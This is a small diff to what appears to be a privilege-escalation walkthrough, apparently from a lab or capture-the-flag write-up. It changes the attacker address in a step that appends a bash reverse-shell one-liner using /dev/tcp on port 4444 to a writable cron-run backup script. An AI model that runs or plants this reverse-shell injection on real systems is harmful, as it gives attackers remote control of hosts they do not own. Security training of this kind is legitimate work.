@@ -29,7 +29,7 @@ find /etc/cron* -writable -type f 2>/dev/null
 2. Inject a reverse shell:
 
     ```bash
-    echo "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /home/joe/.scripts/user_backups.sh
+    echo "bash -i >& /dev/tcp/$LHOST/4444 0>&1" >> /home/joe/.scripts/user_backups.sh
     ```
 
 3. Start listener:
